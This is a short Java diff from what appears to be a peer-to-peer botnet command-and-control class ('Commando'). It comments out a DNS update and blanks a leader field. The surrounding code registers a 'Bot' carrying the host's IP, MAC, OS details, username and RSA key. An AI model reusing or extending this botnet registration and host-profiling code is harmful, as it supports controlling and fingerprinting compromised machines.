@@ -80,9 +80,11 @@ public class Commando {
 	 * 
 	 */
 	public void initializeCeC() {
-		nServ.updateDnsInformation();
+		
+//		non necessario
+//		nServ.updateDnsInformation();
 		// TODO impostare vicinato cc
-		newKing = nServ.getMyIp().toString();
+		newKing = "";
 		pServ.initP2P();
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
